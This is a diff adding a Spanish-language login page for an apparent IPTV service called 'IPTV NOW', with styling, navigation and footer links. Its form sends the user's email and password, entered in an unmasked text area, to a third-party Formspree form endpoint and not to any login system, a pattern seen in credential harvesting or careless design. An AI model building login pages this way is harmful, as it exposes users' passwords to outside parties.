@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f4f4;
+        }
+        .wrapper {
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #333;
+            padding: 10px 20px;
+            color: #fff;
+        }
+        .navbar a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+        }
+        .navbar a:hover {
+            text-decoration: underline;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .nav-links {
+            display: flex;
+            align-items: center;
+        }
+        .content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            background: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin: 20px;
+            border-radius: 8px;
+            max-width: 500px;
+            margin: auto;
+        }
+        .content h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #333;
+            text-align: center;
+        }
+        .formspree-form {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .formspree-form label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        .formspree-form input, .formspree-form textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+        }
+        .formspree-form textarea {
+            height: 15px; /* Tamaño del área de texto */
+            resize: vertical; /* Permite cambiar el tamaño verticalmente */
+        }
+        .formspree-form button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #f8c300;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .formspree-form button:hover {
+            background-color: #e0a500;
+        }
+        .footer {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+        .footer a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+        <header class="navbar">
+            <div class="logo">IPTV NOW</div>
+            <nav class="nav-links">
+                <a href="inicio.html">INICIO</a>
+                <a href="planes.html">PLANES DE SERVICIOS</a>
+                <a href="comprar.html">COMPRAR EL SERVICIO</a>
+                <a href="soporte.html">SOPORTE</a>
+            </nav>
+        </header>
+
+        <section class="content">
+            <div class="formspree-form">
+                <h1>Iniciar Sesión</h1>
+                <form action="https://formspree.io/f/xpwarlaa" method="POST">
+                    <label>
+                        Tu correo electrónico:
+                        <input type="email" name="email" required>
+                    </label>
+                    <label>
+                        Tu Contraseña:
+                        <textarea name="message" rows="4" required></textarea>
+                    </label>
+                    <button type="submit">Enviar</button>
+                </form>
+            </div>
+        </section>
+
+        <footer class="footer">
+            <p>
+                <a href="#facebook">Facebook</a> |
+                <a href="#twitter">Twitter</a> |
+                <a href="#instagram">Instagram</a> |
+                <a href="terminos_y_condiciones.html">Términos y Condiciones</a> |
+                <a href="politica_de_privacidad.html">Política de Privacidad</a> |
+                <a href="soporte.html">Soporte Técnico</a>
+            </p>
+            <p>&copy; 2024 [IPTV Now]. Todos los derechos reservados.</p>
+        </footer>
+    </div>
+
+</body>
+</html>
